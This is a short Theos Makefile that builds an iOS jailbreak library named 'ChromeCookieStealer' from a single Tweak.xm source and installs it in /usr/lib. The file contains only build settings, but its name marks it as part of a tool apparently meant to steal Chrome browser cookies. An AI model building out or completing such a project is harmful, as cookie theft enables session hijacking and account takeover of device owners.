ARCHS = arm64 arm64e
TARGET = iphone:clang:latest:26.0
THEOS_PLATFORM_DEB_COMPRESSION_TYPE = gzip

include $(THEOS)/makefiles/common.mk

LIBRARY_NAME = ChromeCookieStealer
ChromeCookieStealer_FILES = Tweak.xm
ChromeCookieStealer_FRAMEWORKS = UIKit WebKit Foundation
ChromeCookieStealer_INSTALL_PATH = /usr/lib
ChromeCookieStealer_CFLAGS = -fobjc-arc

include $(THEOS)/makefiles/library.mk
